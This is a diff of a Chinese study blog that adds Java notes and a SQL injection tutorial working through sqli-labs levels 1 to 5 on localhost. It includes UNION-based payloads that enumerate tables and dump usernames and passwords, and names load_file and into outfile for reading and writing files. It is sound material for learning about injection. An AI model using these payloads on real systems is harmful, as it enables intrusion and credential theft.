class="comment">/*特点：</span></span><br><span class="line"><span class="comment">1.方法名与类名相同</span></span><br><span class="line"><span class="comment">2.没有返回值类型，无 `void`</span></span><br><span class="line"><span class="comment">3.没有返回值，无`return`</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">//如果没有写任何构造方法，虚拟机会自动添加空参构造方法</span></span><br><span class="line">    <span class="comment">//如果定义了构造方法，不再提供默认的构造方法</span></span><br><span class="line"> 	<span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//空参构造方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="comment">//带全部参数构造方法</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><strong>注：无论是否使用，都手动书写空参构造方法和带全部参数构造方法</strong></p>
-<h2><span id="对象">对象</span></h2><h3><span id="类">类</span></h3><h4><span id="定义类">定义类:</span></h4><ul>
+<h2><span id="java高级特征">JAVA高级特征</span></h2><h3><span id="类">类</span></h3><h4><span id="定义类">定义类:</span></h4><ul>
 <li>javabean类：用来描述一类事物的类，不写main方法。</li>
 <li>测试类：编写main方法的类，在测试类中创建javabean类的对象并进行赋值调用</li>
+<li>工具类：帮我们做一些事情，不描述任何事物的类</li>
 </ul>
 <blockquote>
 <p>public class 类名{</p>
@@ -555,11 +857,48 @@
 </li>
 </ul>
 </blockquote>
+<h4><span id="工具类">工具类</span></h4><p><img src="/2023/03/10/JAVA/image-20230604212157364.png" alt="image-20230604212157364"></p>
+<h4><span id="抽象类">抽象类</span></h4><p><img src="/2023/03/10/JAVA/image-20230612191500546.png" alt="image-20230612191500546"></p>
+<p><img src="/2023/03/10/JAVA/image-20230612191511490.png" alt="image-20230612191511490"></p>
+<h5><span id="注意事项">注意事项：</span></h5><p><img src="/2023/03/10/JAVA/image-20230612191727894.png" alt="image-20230612191727894"></p>
+<h4><span id="包装类">包装类</span></h4><p>**把基本数据类型变成了对象 **</p>
+<p><img src="/2023/03/10/JAVA/image-20230613162317447.png" alt="image-20230613162317447"></p>
+<p><img src="/2023/03/10/JAVA/image-20230613162500670.png" alt="image-20230613162500670"></p>
+<h3><span id="内部类">内部类</span></h3><p><img src="/2023/03/10/JAVA/image-20230612201811015.png" alt="image-20230612201811015"></p>
+<h4><span id="成员内部类">成员内部类</span></h4><ul>
+<li>写在成员位置，属于外部类的成员</li>
+</ul>
+<p><img src="/2023/03/10/JAVA/image-20230613153102779.png" alt="image-20230613153102779"></p>
+<h4><span id="静态内部类">静态内部类</span></h4><p><img src="/2023/03/10/JAVA/image-20230613153332338.png" alt="image-20230613153332338"></p>
+<h4><span id="局部内部类">局部内部类</span></h4><h4><span id="匿名内部类">匿名内部类</span></h4><p><img src="/2023/03/10/JAVA/image-20230613155434723.png" alt="image-20230613155434723"></p>
+<h4><span id="lambda表达式">lambda表达式</span></h4><p><img src="/2023/03/10/JAVA/image-20230613164149621.png" alt="image-20230613164149621"></p>
 <h3><span id="封装">封装</span></h3><p><strong>对象代表什么，就得封装对应的数据，并提供数据对应的行为</strong></p>
 <p>例如：人关门</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span>&#123;</span><br><span class="line">    ······</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">door</span>&#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;<span class="comment">//门的状态数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">open</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//开门，修改门的状态</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clse</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//关门，修改门的状态</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2><span id="修饰符">修饰符</span></h2><h3><span id="private关键字保证数据的安全性">private关键字–保证数据的安全性</span></h3><p>通过<strong>public方法</strong>过滤数据</p>
+<h3><span id="继承">继承</span></h3><h4><span id="虚方法表">虚方法表</span></h4><ul>
+<li>非私有—-&gt;非private</li>
+<li>非static</li>
+<li>非final</li>
+</ul>
+<p><img src="/2023/03/10/JAVA/image-20230605230127981.png" alt="image-20230605230127981"></p>
+<h4><span id="成员变量的访问特点">成员变量的访问特点</span></h4><p><img src="/2023/03/10/JAVA/image-20230606165258084.png" alt="image-20230606165258084"></p>
+<h4><span id="成员方法的访问特点">成员方法的访问特点</span></h4><p><img src="/2023/03/10/JAVA/image-20230612141847231.png" alt="image-20230612141847231"></p>
+<h5><span id="方法的重写">方法的重写</span></h5><p><img src="/2023/03/10/JAVA/image-20230612141936589.png" alt="image-20230612141936589"></p>
+<p><img src="/2023/03/10/JAVA/image-20230612142237988.png" alt="image-20230612142237988"></p>
+<h4><span id="构造方法访问特点">构造方法访问特点</span></h4><p><img src="/2023/03/10/JAVA/image-20230612143343791.png" alt="image-20230612143343791"></p>
+<h4><span id="this-super总结">this、super总结</span></h4><p><img src="/2023/03/10/JAVA/image-20230612144659609.png" alt="image-20230612144659609"></p>
+<h3><span id="多态">多态</span></h3><p><img src="/2023/03/10/JAVA/image-20230612153101470.png" alt="image-20230612153101470"></p>
+<h4><span id="调用成员的特点">调用成员的特点</span></h4><p><img src="/2023/03/10/JAVA/image-20230612181813841.png" alt="image-20230612181813841"></p>
+<h4><span id="优劣">优劣</span></h4><p><img src="/2023/03/10/JAVA/image-20230612183153710.png" alt="image-20230612183153710"></p>
+<h3><span id="接口">接口</span></h3><p><img src="/2023/03/10/JAVA/image-20230612194110636.png" alt="image-20230612194110636"></p>
+<h4><span id="接口中成员的特点">接口中成员的特点</span></h4><p><img src="/2023/03/10/JAVA/image-20230612194629458.png" alt="image-20230612194629458"></p>
+<p><img src="/2023/03/10/JAVA/image-20230612200255600.png" alt="image-20230612200255600"></p>
+<p><img src="/2023/03/10/JAVA/image-20230612200950374.png" alt="image-20230612200950374"></p>
+<p><img src="/2023/03/10/JAVA/image-20230612201359599.png" alt="image-20230612201359599"></p>
+<h3><span id="接口和类之间的关系">接口和类之间的关系</span></h3><p><img src="/2023/03/10/JAVA/image-20230612195546129.png" alt="image-20230612195546129"></p>
+<h2><span id="修饰符">修饰符</span></h2><p><img src="/2023/03/10/JAVA/image-20230612185438892.png" alt="image-20230612185438892"></p>
+<h3><span id="private关键字保证数据的安全性">private关键字–保证数据的安全性</span></h3><p>通过<strong>public方法</strong>过滤数据</p>
 <ul>
 <li><p>权限修饰符</p>
 </li>
@@ -585,10 +924,35 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GirlFriend</span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">//行为</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;<span class="comment">//将形参的值传递给成员变量name</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h4><span id="内存">内存</span></h4><p>this的本质：代表方法调用者的地址值 </p>
+<h3><span id="static">static</span></h3><p><strong>共享</strong></p>
+<h4><span id="静态变量和静态方法">静态变量和静态方法</span></h4><p><img src="/2023/03/10/JAVA/image-20230605154834575.png" alt="image-20230605154834575"></p>
+<h4><span id="注意事项">注意事项：</span></h4><p><img src="/2023/03/10/JAVA/image-20230605170329657.png" alt="image-20230605170329657"></p>
+<h4><span id="静态代码块">静态代码块</span></h4><p><img src="/2023/03/10/JAVA/image-20230612191019862.png" alt="image-20230612191019862"></p>
+<h3><span id="final">final</span></h3><p><img src="/2023/03/10/JAVA/image-20230612184518723.png" alt="image-20230612184518723"></p>
+<p><img src="/2023/03/10/JAVA/image-20230612184913571.png" alt="image-20230612184913571"></p>
+<h2><span id="包">包</span></h2><p><img src="/2023/03/10/JAVA/image-20230612183437287.png" alt="image-20230612183437287"></p>
+<p><img src="/2023/03/10/JAVA/image-20230612183614390.png" alt="image-20230612183614390"></p>
 <h2><span id="内存管理">内存管理</span></h2><h3><span id="栈先进后出">· 栈：先进后出</span></h3><p>方法运行时使用的内存，方法进栈运行，运行完毕出栈</p>
 <h3><span id="堆">· 堆：</span></h3><p><strong>new</strong>出来的都在堆内存中开辟了一个小空间</p>
 <h3><span id="方法区元空间">·方法区（元空间）</span></h3><p>字节码文件（XXX.class)加载时进入的内存</p>
-<h3><span id="本地方法栈">·本地方法栈</span></h3><h3><span id="寄存器">·寄存器</span></h3>
+<h3><span id="本地方法栈">·本地方法栈</span></h3><h3><span id="寄存器">·寄存器</span></h3><h2><span id="异常">异常</span></h2><p><img src="/2023/03/10/JAVA/image-20230613213104575.png" alt="image-20230613213104575"></p>
+<p><img src="/2023/03/10/JAVA/image-20230613213250213.png" alt="image-20230613213250213"></p>
+<p><img src="/2023/03/10/JAVA/image-20230613213344438.png" alt="image-20230613213344438"></p>
+<p><img src="/2023/03/10/JAVA/image-20230613213649292.png" alt="image-20230613213649292"></p>
+<p><img src="/2023/03/10/JAVA/image-20230614131323138.png" alt="image-20230614131323138"></p>
+<h3><span id="抛出异常">抛出异常</span></h3><p><img src="/2023/03/10/JAVA/image-20230614131937207.png" alt="image-20230614131937207"></p>
+<h3><span id="自定义异常">自定义异常</span></h3><p><img src="/2023/03/10/JAVA/image-20230614133709831.png" alt="image-20230614133709831"></p>
+<h2><span id="file">File</span></h2><p><img src="/2023/03/10/JAVA/image-20230614142223410.png" alt="image-20230614142223410"></p>
+<p><img src="/2023/03/10/JAVA/image-20230614142828423.png" alt="image-20230614142828423"></p>
+<h2><span id="io流">IO流</span></h2><p><img src="/2023/03/10/JAVA/image-20230614144806753.png" alt="image-20230614144806753"></p>
+<p><img src="/2023/03/10/JAVA/image-20230614144618490.png" alt="image-20230614144618490"></p>
+<h3><span id="io流体系">IO流体系</span></h3><h4><span id="fileoutputstream">FileOutputStream</span></h4><p><img src="/2023/03/10/JAVA/image-20230614144927680.png" alt="image-20230614144927680"></p>
+<p><img src="/2023/03/10/JAVA/image-20230614145116326.png" alt="image-20230614145116326"></p>
+<p><img src="/2023/03/10/JAVA/image-20230614145912669.png" alt="image-20230614145912669"></p>
+<p><img src="/2023/03/10/JAVA/image-20230614151105927.png" alt="image-20230614151105927"></p>
+<h4><span id="fileinputstream">FileInputStream</span></h4><p><img src="/2023/03/10/JAVA/image-20230614151646474.png" alt="image-20230614151646474"></p>
+<h4><span id="缓冲流">缓冲流</span></h4><p><img src="/2023/03/10/JAVA/image-20230614154323390.png" alt="image-20230614154323390"></p>
+
       
     </div>
     <footer class="article-footer">
@@ -645,6 +1009,34 @@
 <li><a href="#144%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2">1.4.4堆叠查询</a></li>
 </ul>
 </li>
+</ul>
+</li>
+<li><a href="#2">2、</a><ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99">文件读写</a></li>
+<li><a href="#url%E7%BC%96%E7%A0%81">url编码</a></li>
+</ul>
+</li>
+<li><a href="#3">3、</a><ul>
+<li><a href="#mysql">MySQL</a><ul>
+<li><a href="#information_schema%E5%BA%93">information_schema库</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#4-sqli-labs-master%E9%9D%B6%E5%9C%BA">4、sqli-labs-master靶场</a><ul>
+<li><a href="#level1-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B">Level1 单引号字符型</a></li>
+<li><a href="#level2-get%E6%95%B4%E5%9E%8B">Level2 GET整型</a></li>
+<li><a href="#level3-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2">Level3 单引号变形</a></li>
+<li><a href="#level4-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B">Level4 双引号字符型</a></li>
+<li><a href="#level5-%E7%9B%B2%E6%B3%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">Level5 盲注/报错注入</a></li>
+<li><a href="#level6-%E4%B8%8E%E4%B8%8A%E9%A2%98%E7%9B%B8%E5%90%8C%E9%97%AD%E5%90%88%E4%B8%8D%E5%90%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88">Level6 与上题相同，闭合不同双引号闭合</a></li>
+<li><a href="#level7-%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5">Level7 基于文件写入</a></li>
+<li><a href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC">一句话木马</a></li>
+<li><a href="#level8-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">Level8 布尔盲注</a></li>
+<li><a href="#level9-10-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">Level9 -10 时间盲注</a></li>
+<li><a href="#level11post%E4%BC%A0%E5%8F%82">Level11Post传参</a></li>
+<li><a href="#level15">Level15</a></li>
 </ul>
 </li>
 </ul>
@@ -950,7 +1342,210 @@
 </tr>
 </tbody></table>
 <h3><span id="144堆叠查询">1.4.4堆叠查询</span></h3><p>指的是在单个数据库连接中执行多个查询序列。</p>
+<h1><span id="2">2、</span></h1><h2><span id="信息收集">信息收集</span></h2><table>
+<thead>
+<tr>
+<th>功能</th>
+<th>函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>操作系统</td>
+<td>@@version_compile_os</td>
+</tr>
+<tr>
+<td>数据库版本</td>
+<td>version()</td>
+</tr>
+<tr>
+<td>数据库名</td>
+<td>database()</td>
+</tr>
+<tr>
+<td>数据库用户</td>
+<td>user()</td>
+</tr>
+<tr>
+<td>数据库安装路径</td>
+<td>@@basedir</td>
+</tr>
+<tr>
+<td>拼接</td>
+<td>group_concat(@@version_compile_os,’ | ‘,version(),’ | ‘,@@basedir )</td>
+</tr>
+<tr>
+<td></td>
+<td>group_concat(database(),’ | ‘,user())</td>
+</tr>
+</tbody></table>
+<h2><span id="文件读写">文件读写</span></h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>load_file(‘路径’)</td>
+<td>读取</td>
+</tr>
+<tr>
+<td>into outfile 或者into dumpfile</td>
+<td>写入</td>
+</tr>
+</tbody></table>
+<h2><span id="url编码">url编码</span></h2><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>编码值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>#</td>
+<td>%23</td>
+</tr>
+<tr>
+<td>–空格</td>
+<td>–%20</td>
+</tr>
+<tr>
+<td>–+</td>
+<td></td>
+</tr>
+</tbody></table>
+<h1><span id="3">3、</span></h1><h2><span id="mysql">MySQL</span></h2><h3><span id="information_schema库">information_schema库</span></h3><table>
+<thead>
+<tr>
+<th>表名</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>information_schema.schemata</td>
+<td>记录所有库名的表</td>
+</tr>
+<tr>
+<td>information_schema.tables</td>
+<td>记录所有表名的表</td>
+</tr>
+<tr>
+<td>information_schema.columns</td>
+<td>记录所有字段名的表</td>
+</tr>
+</tbody></table>
+<h4><span id="schemata表">schemata表</span></h4><table>
+<thead>
+<tr>
+<th>字段名</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>schema_name</td>
+<td>数据库名</td>
+</tr>
+</tbody></table>
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917221039225.png" alt="image-20230917221039225"></p>
+<h4><span id="tables表">tables表</span></h4><table>
+<thead>
+<tr>
+<th>列名</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>table_schema</td>
+<td>数据库名称</td>
+</tr>
+<tr>
+<td>table_name</td>
+<td>表名</td>
+</tr>
+</tbody></table>
+<h4><span id="columns表">columns表</span></h4><table>
+<thead>
+<tr>
+<th>列名</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>table_schema</td>
+<td>数据库名</td>
+</tr>
+<tr>
+<td>table_name</td>
+<td>表名</td>
+</tr>
+<tr>
+<td>column_name</td>
+<td>列名</td>
+</tr>
+</tbody></table>
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917002550128.png" alt="image-20230917002550128"></p>
+<h1><span id="4-sqli-labs-master靶场">4、sqli-labs-master靶场</span></h1><h3><span id="level1-单引号字符型">Level1 单引号字符型</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917124133009.png" alt="image-20230917124133009"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="存在注入点判断">存在注入点判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;	#回显错误</span></span><br></pre></td></tr></table></figure>
 
+<p>单引号报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/</span><br><span class="line">?id=1&#x27; --+回显正常</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917132948580.png" alt="image-20230917132948580"></p>
+<h5><span id="字段数判断">字段数判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1--+  #回显正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span><span class="comment">--+  #回显正常</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3--+  #回显正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span><span class="comment">--+  #回显错误</span></span><br><span class="line"><span class="comment">-------------------&gt;字段数为3</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917133329402.png" alt="image-20230917133329402"></p>
+<h5><span id="判断回显位置">判断回显位置</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;	#id不存在，不回显</span></span><br><span class="line"><span class="string">union select 1,2,3 --+ #回显位置</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917133646711.png" alt="image-20230917133646711"></p>
+<p>回显位置为2、3</p>
+<h5><span id="信息收集">信息收集</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,</span></span><br><span class="line"><span class="string">group_concat(@@version_compile_os,&#x27;</span><span class="operator">|</span><span class="string">&#x27;,version()),  #操作系统 | 数据版本</span></span><br><span class="line"><span class="string">group_concat(database(),&#x27;</span> <span class="operator">|</span> <span class="string">&#x27;,user()) --+	#数据库名称 | 用户名</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917134340353.png" alt="image-20230917134340353"></p>
+<h5><span id="查看数据库数据">查看数据库数据</span></h5><h6><span id="查表名">查表名</span></h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,</span></span><br><span class="line"><span class="string">group_concat(table_name) from information_schema.tables </span></span><br><span class="line"><span class="string">where table_schema = database() --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917134941454.png" alt="image-20230917134941454"></p>
+<h6><span id="查列名字段名">查列名（字段名）</span></h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,</span></span><br><span class="line"><span class="string">group_concat(column_name) from information_schema.columns </span></span><br><span class="line"><span class="string">where table_schema = database() </span></span><br><span class="line"><span class="string">	and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917135242068.png" alt="image-20230917135242068"></p>
+<h6><span id="查数据">查数据</span></h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,</span></span><br><span class="line"><span class="string">group_concat(id,&#x27;</span><span class="comment">--&#x27;,username,&#x27;--&#x27;,password) from users --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917135448500.png" alt="image-20230917135448500"></p>
+<h3><span id="level2-get整型">Level2 GET整型</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917135907264.png" alt="image-20230917135907264"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="注入点判断">注入点判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-2</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>	#回显正常</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;	#回显错误</span></span><br><span class="line"><span class="string">?id=1 and 1=1 --+	#回显正常</span></span><br><span class="line"><span class="string">?id=1 and 1=2 --+	#无回显</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*后续不需要单引号闭合*/</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="level3-单引号变形">Level3 单引号变形</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917140925082.png" alt="image-20230917140925082"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="注入点判断">注入点判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-3</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) and 1=1 --+ #回显正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+ #无回显</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="level4-双引号字符型">Level4 双引号字符型</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917141601494.png" alt="image-20230917141601494"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="注入点判断">注入点判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-4</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=2--+	#报错</span><br><span class="line">?id=1&quot;) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="comment">--+	#不回显</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) and 1=1--+	#正常回显</span><br></pre></td></tr></table></figure>
+
+<h3><span id="level5-盲注报错注入">Level5    盲注/报错注入</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917184630468.png" alt="image-20230917184630468"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="注入点判断">注入点判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>	#回显正常	成功执行</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>	#回显正常	成功执行</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2	#回显报错</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+	#无回显</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 --+	#回显成功 </span></span><br></pre></td></tr></table></figure>
+
